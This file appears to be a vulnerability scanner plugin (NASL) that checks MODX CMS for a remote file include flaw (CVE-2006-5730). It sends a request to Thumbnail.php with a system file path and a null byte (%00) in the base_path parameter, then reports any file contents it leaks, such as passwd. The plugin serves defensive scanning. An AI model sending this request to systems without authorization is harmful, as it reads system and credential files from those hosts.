if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80072" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-5730" );
	script_bugtraq_id( 20898 );
	script_xref( name: "OSVDB", value: "30186" );
	script_name( "MODX CMS base_path Parameter Remote File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2008 Justin Seitz" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_modx_cms_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "modx_cms/installed" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/2706" );
	script_xref( name: "URL", value: "http://modxcms.com/forums/index.php/topic,8604.0.html" );
	script_tag( name: "summary", value: "The remote web server is running MODX CMS, an open source content
  management system which is affected by a remote file include issue." );
	script_tag( name: "insight", value: "The version of MODX CMS installed on the remote host fails to sanitize
  input to the 'base_path' parameter before using it in the 'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
  script to include PHP code." );
	script_tag( name: "impact", value: "Provided PHP's 'register_globals' setting is enabled, an unauthenticated
  attacker can exploit this issue to view arbitrary files and execute arbitrary code,
  possibly taken from third-party hosts, on the remote host." );
	script_tag( name: "solution", value: "Update to version 0.9.2.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
cpe_list = make_list( "cpe:/a:modx:unknown",
	 "cpe:/a:modx:revolution",
	 "cpe:/a:modx:evolution" );
if(!infos = get_app_port_from_list( cpe_list: cpe_list )){
	exit( 0 );
}
cpe = infos["cpe"];
port = infos["port"];
if(!dir = get_app_location( cpe: cpe, port: port )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = "/" + files[pattern];
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00" );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(!res){
		continue;
	}
	if(egrep( pattern: pattern, string: res ) || ContainsString( res, NASLString( "main(", file, "\\\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream" ) ) || ContainsString( res, NASLString( "main(", file, "): failed to open stream: No such file" ) ) || ContainsString( res, "open_basedir restriction in effect. File(" )){
		passwd = NULL;
		if(egrep( pattern: pattern, string: res )){
			passwd = res;
			if(ContainsString( passwd, "<br" )){
				passwd = passwd - strstr( passwd, "<br" );
			}
		}
		if( passwd ){
			info = NASLString( "The version of MODX CMS installed in directory '", dir, "'\\n", "is vulnerable to this issue. Here is the contents of " + file + "\\n", "from the remote host :\\n\\n", passwd );
		}
		else {
			info = "";
		}
		security_message( data: info, port: port );
		exit( 0 );
	}
}
exit( 99 );

